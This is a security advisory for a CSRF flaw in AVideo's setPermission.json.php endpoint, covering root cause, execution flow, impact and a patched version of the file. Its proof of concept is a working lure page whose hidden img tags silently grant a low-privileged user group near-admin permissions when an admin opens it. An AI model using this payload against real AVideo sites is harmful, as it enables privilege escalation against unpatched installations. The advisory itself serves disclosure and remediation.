# [H] AVideo's GET-Based CSRF in setPermission.json.php Enables Privilege Escalation via Arbitrary Permission Modification

## Summary
Severity: High
Advisory: GHSA-g8x9-7mgh-7cvj
CVE: CVE-2026-33649
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-g8x9-7mgh-7cvj
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `plugin/Permissions/setPermission.json.php` endpoint accepts GET parameters for a state-changing operation that modifies user group permissions. The endpoint has no CSRF token validation, and the application explicitly sets `session.cookie_samesite=None` on session cookies. This allows an unauthenticated attacker to craft a page with `<img>` tags that, when visited by an admin, silently grant arbitrary permissions to the attacker's user group — escalating the attacker to near-admin access.

## Details

The root cause is a combination of three issues:

**1. `$_REQUEST` used instead of `$_POST` (accepts GET parameters):**

`plugin/Permissions/setPermission.json.php:14-24`:
```php
$intvalList = array('users_groups_id','plugins_id','type','isEnabled');
foreach ($intvalList as $value) {
    if($_REQUEST[$value]==='true'){
        $_REQUEST[$value] = 1;
    }else{
        $_REQUEST[$value] = intval($_REQUEST[$value]);
    }
}

$obj = new stdClass();
$obj->id = Permissions::setPermission($_REQUEST['users_groups_id'], $_REQUEST['plugins_id'], $_REQUEST['type'], $_REQUEST['isEnabled']);
```

The only authorization check is `User::isAdmin()` at line 10 — there is no CSRF token validation via `isGlobalTokenValid()`.

**2. Session cookies set to `SameSite=None`:**

`objects/include_config.php:134-141`:
```php
if ($isHTTPS) {
    // SameSite=None is intentional: AVideo supports cross-origin iframe embedding
    ini_set('session.cookie_samesite', 'None');
    ini_set('session.cookie_secure', '1');
}
```

This means the admin's session cookie is sent on cross-origin requests, including those initiated by `<img src="...">` tags on attacker-controlled pages.

**3. The codebase's own security model requires CSRF tokens on state-mutating endpoints:**

The comment at `include_config.php:137-138` states: *"All state-mutating endpoints that are vulnerable to CSRF must instead enforce a short-lived globalToken (verifyToken)."* Other endpoints like `saveSort.json.php` and `pluginImport.json.php` enforce `isGlobalTokenValid()`, but `setPermission.json.php` does not.

**Execution flow:**
1. Attacker hosts a page containing `<img src="https://target/plugin/Permissions/setPermission.json.php?users_groups_id=2&plugins_id=1&type=10&isEnabled=true">`
2. Admin visits the page (e.g., via link in forum, email, or embedded content)
3. Browser issues GET request with the admin's `SameSite=None` session cookie
4. `User::isAdmin()` passes because the request carries the admin's session
5. `Permissions::setPermission()` grants PERMISSION_FULLACCESSVIDEOS (type=10) to user group 2
6. Any user in group 2 (including the attacker) now has full video admin access

The `users_groups_id` values are small sequential integers (typically 1-3 for default groups) and can be trivially enumerated.

## PoC

**Step 1: Attacker creates a page granting multiple permissions to their user group (ID 2):**

```html
<!DOCTYPE html>
<html>
<head><title>Interesting Video</title></head>
<body>
<h1>Check out this video!</h1>
<!-- Each img tag silently fires a GET request with admin's session cookie -->
<!-- PERMISSION_FULLACCESSVIDEOS (type=10) -->
<img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&plugins_id=1&type=10&isEnabled=true' style='display:none'>
<!-- PERMISSION_USERS (type=20) -->
<img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&plugins_id=1&type=20&isEnabled=true' style='display:none'>
<!-- PERMISSION_CAN_UPLOAD_VIDEOS (type=70) -->
<img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&plugins_id=1&type=70&isEnabled=true' style='display:none'>
<!-- PERMISSION_CAN_LIVESTREAM (type=80) -->
<img src='https://target.example.com/plugin/Permissions/setPermission.json.php?users_groups_id=2&plugins_id=1&type=80&isEnabled=true' style='display:none'>
</body>
</html>
```

**Step 2: Attacker sends the link to an admin (social engineering, forum post, etc.)**

**Step 3: When the admin loads the page, all four `<img>` tags fire simultaneously.**

Expected response for each request (visible in browser dev tools):
```json
{"id":"1"}
```

**Step 4: Verify — the attacker (a regular user in group 2) now has full video management, user management, upload, and livestream permissions without being an admin.**

## Impact

- **Privilege escalation:** A low-privileged user can gain near-admin permissions (full video access, user management, upload, livestream) by tricking an admin into loading a single page.
- **No JavaScript required:** The attack uses only `<img>` tags, bypassing Content Security Policy restrictions and working even in contexts where scripts are blocked (email clients, forum BBCode, etc.).
- **Zero interaction beyond page load:** Unlike POST-based CSRF that requires form submission or JavaScript, this fires automatically when the page renders.
- **Chaining:** Multiple permissions can be granted simultaneously by embedding multiple `<img>` tags. An attacker can grant their group all available permission types in a single page load.
- **Blast radius:** All users in the targeted group receive the escalated permissions, not just the attacker.

## Recommended Fix

In `plugin/Permissions/setPermission.json.php`, change `$_REQUEST` to `$_POST` and add CSRF token validation:

```php
<?php

header('Content-Type: application/json');
if (!isset($global['systemRootPath'])) {
    $configFile = '../../videos/configuration.php';
    if (file_exists($configFile)) {
        require_once $configFile;
    }
}
if(!User::isAdmin()){
    forbiddenPage("Not admin");
}

// Enforce POST method and CSRF token
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die(json_encode(array('error' => 'POST method required')));
}
if (!isGlobalTokenValid()) {
    die(json_encode(array('error' => 'Invalid CSRF token')));
}

$intvalList = array('users_groups_id','plugins_id','type','isEnabled');
foreach ($intvalList as $value) {
    if($_POST[$value]==='true'){
        $_POST[$value] = 1;
    }else{
        $_POST[$value] = intval($_POST[$value]);
    }
}

$obj = new stdClass();
$obj->id = Permissions::setPermission($_POST['users_groups_id'], $_POST['plugins_id'], $_POST['type'], $_POST['isEnabled']);

die(json_encode($obj));
```

The AJAX call in `getPermissionsFromPlugin.html.php:84-92` already uses `type: 'post'` but must also send the `globalToken` parameter in its data payload.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-g8x9-7mgh-7cvj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33649
- https://github.com/WWBN/AVideo
